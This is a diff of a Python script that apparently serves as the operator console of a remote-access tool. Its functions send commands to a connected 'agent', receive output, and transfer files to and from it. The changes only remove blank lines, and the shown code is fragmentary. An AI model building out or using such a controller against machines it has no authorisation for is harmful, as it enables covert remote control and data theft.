@@ -92,8 +92,6 @@ def Session(host, port):
     print("[+]bye!")
     exit(1)
 
-    
-
 def Disconnected():
     disconnected = input("[+] agent disconnected: (keep) Or (exit): ")
     #while len(disconnected) == 0:
@@ -106,16 +104,8 @@ def Disconnected():
         else:
             disconnected = input("[+] (keep) or (exit): ")
     
-    
-
-
 def SendCommand(conn, command):
     conn.sendall(command.encode("utf-8"))
-
-
-
-
-
 
 def RecvOutput(conn):
     output = ""
@@ -135,11 +125,6 @@ def RecvOutput(conn):
             break
     return output
 
-
-
-
-
-
 def CloseSession(conn, command):
     try:
         conn.sendall(command.encode("utf-8"))
@@ -150,11 +135,6 @@ def CloseSession(conn, command):
         print("[!] the agent didn't receive the exit command. exiting anyway. ")
     print("[+] you have exited the session with the agent")
     
-
-
-
-
-
 def DownloadFile(content):
     if "file does not exist" in content:
         print("[!] the file does not exist")
@@ -170,7 +150,6 @@ def DownloadFile(content):
                 outfile.write((base64.b64decode(content)).decode("utf-8"))
                 outfile.close()
 
-
 def UploadFile(filepath):
     if os.path.isfile(filepath) and os.path.exists(filepath):
         print("[+] make sure the web server is started")
@@ -180,11 +159,6 @@ def UploadFile(filepath):
         print("[!] the file {0} does not exists".format(filepath))
         return False
 
-
-
-
-
-
 def main():
 
         bind_host = input("[+] enter ip address: ")
@@ -192,6 +166,5 @@ def main():
         keep_listening = "k"
         Session(bind_host, bind_port)
         
-                
-
+               
 main()
